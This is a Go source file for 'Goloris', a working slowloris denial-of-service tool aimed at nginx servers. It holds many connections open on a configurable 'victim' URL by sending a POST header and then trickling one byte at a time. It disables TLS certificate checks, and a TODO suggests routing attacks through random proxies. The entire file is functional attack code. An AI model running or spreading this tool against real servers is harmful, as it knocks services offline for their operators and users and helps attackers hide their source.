// Goloris - slowloris[1] for nginx.
//
// The original source code is available at http://github.com/valyala/goloris.
//
package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/url"
	"runtime"
	"strings"
	"time"
)

var (
	contentLength    = flag.Int("contentLength", 1000*1000, "The maximum length of fake POST body in bytes. Adjust to nginx's client_max_body_size")
	dialWorkersCount = flag.Int("dialWorkersCount", 10, "The number of workers simultaneously busy with opening new TCP connections")
	goMaxProcs       = flag.Int("goMaxProcs", runtime.NumCPU(), "The maximum number of CPUs to use. Don't touch :)")
	rampUpInterval   = flag.Duration("rampUpInterval", time.Second, "Interval between new connections' acquisitions for a single dial worker (see dialWorkersCount)")
	sleepInterval    = flag.Duration("sleepInterval", 10*time.Second, "Sleep interval between subsequent packets sending. Adjust to nginx's client_body_timeout")
	testDuration     = flag.Duration("testDuration", time.Hour, "Test duration")
	victimUrl        = flag.String("victimUrl", "http://127.0.0.1/", "Victim's url. Http POST must be allowed in nginx config for this url")
	hostHeader       = flag.String("hostHeader", "", "Host header value in case it is different than the hostname in victimUrl")
)

var (
	sharedReadBuf  = make([]byte, 4096)
	sharedWriteBuf = []byte("A")

	tlsConfig = &tls.Config{
		InsecureSkipVerify: true,
	}
)

func main() {
	flag.Parse()
	flag.VisitAll(func(f *flag.Flag) {
		fmt.Printf("%s=%v\n", f.Name, f.Value)
	})

	runtime.GOMAXPROCS(*goMaxProcs)

	victimUri, err := url.Parse(*victimUrl)
	if err != nil {
		log.Fatalf("Cannot parse victimUrl=[%s]: [%s]\n", victimUrl, err)
	}
	victimHostPort := victimUri.Host
	if !strings.Contains(victimHostPort, ":") {
		port := "80"
		if victimUri.Scheme == "https" {
			port = "443"
		}
		victimHostPort = net.JoinHostPort(victimHostPort, port)
	}
	host := victimUri.Host
	if len(*hostHeader) > 0 {
		host = *hostHeader
	}
	requestHeader := []byte(fmt.Sprintf("POST %s HTTP/1.1\nHost: %s\nContent-Type: application/x-www-form-urlencoded\nContent-Length: %d\n\n",
		victimUri.RequestURI(), host, *contentLength))

	dialWorkersLaunchInterval := *rampUpInterval / time.Duration(*dialWorkersCount)
	activeConnectionsCh := make(chan int, *dialWorkersCount)
	go activeConnectionsCounter(activeConnectionsCh)
	for i := 0; i < *dialWorkersCount; i++ {
		go dialWorker(activeConnectionsCh, victimHostPort, victimUri, requestHeader)
		time.Sleep(dialWorkersLaunchInterval)
	}
	time.Sleep(*testDuration)
}

func dialWorker(activeConnectionsCh chan<- int, victimHostPort string, victimUri *url.URL, requestHeader []byte) {
	isTls := (victimUri.Scheme == "https")
	for {
		time.Sleep(*rampUpInterval)
		conn := dialVictim(victimHostPort, isTls)
		if conn != nil {
			go doLoris(conn, victimUri, activeConnectionsCh, requestHeader)
		}
	}
}

func activeConnectionsCounter(ch <-chan int) {
	var connectionsCount int
	for n := range ch {
		connectionsCount += n
		log.Printf("Holding %d connections\n", connectionsCount)
	}
}

func dialVictim(hostPort string, isTls bool) io.ReadWriteCloser {
	// TODO hint: add support for dialing the victim via a random proxy
	// from the given pool.
	conn, err := net.Dial("tcp", hostPort)
	if err != nil {
		log.Printf("Couldn't esablish connection to [%s]: [%s]\n", hostPort, err)
		return nil
	}
	tcpConn := conn.(*net.TCPConn)
	if err = tcpConn.SetReadBuffer(128); err != nil {
		log.Fatalf("Cannot shrink TCP read buffer: [%s]\n", err)
	}
	if err = tcpConn.SetWriteBuffer(128); err != nil {
		log.Fatalf("Cannot shrink TCP write buffer: [%s]\n", err)
	}
	if err = tcpConn.SetLinger(0); err != nil {
		log.Fatalf("Cannot disable TCP lingering: [%s]\n", err)
	}
	if !isTls {
		return tcpConn
	}

	tlsConn := tls.Client(conn, tlsConfig)
	if err = tlsConn.Handshake(); err != nil {
		conn.Close()
		log.Printf("Couldn't establish tls connection to [%s]: [%s]\n", hostPort, err)
		return nil
	}
	return tlsConn
}

func doLoris(conn io.ReadWriteCloser, victimUri *url.URL, activeConnectionsCh chan<- int, requestHeader []byte) {
	defer conn.Close()

	if _, err := conn.Write(requestHeader); err != nil {
		log.Printf("Cannot write requestHeader=[%v]: [%s]\n", requestHeader, err)
		return
	}

	activeConnectionsCh <- 1
	defer func() { activeConnectionsCh <- -1 }()

	readerStopCh := make(chan int, 1)
	go nullReader(conn, readerStopCh)

	for i := 0; i < *contentLength; i++ {
		select {
		case <-readerStopCh:
			return
		case <-time.After(*sleepInterval):
		}
		if _, err := conn.Write(sharedWriteBuf); err != nil {
			log.Printf("Error when writing %d byte out of %d bytes: [%s]\n", i, *contentLength, err)
			return
		}
	}
}

func nullReader(conn io.Reader, ch chan<- int) {
	defer func() { ch <- 1 }()
	n, err := conn.Read(sharedReadBuf)
	if err != nil {
		log.Printf("Error when reading server response: [%s]\n", err)
	} else {
		log.Printf("Unexpected response read from server: [%s]\n", sharedReadBuf[:n])
	}
}
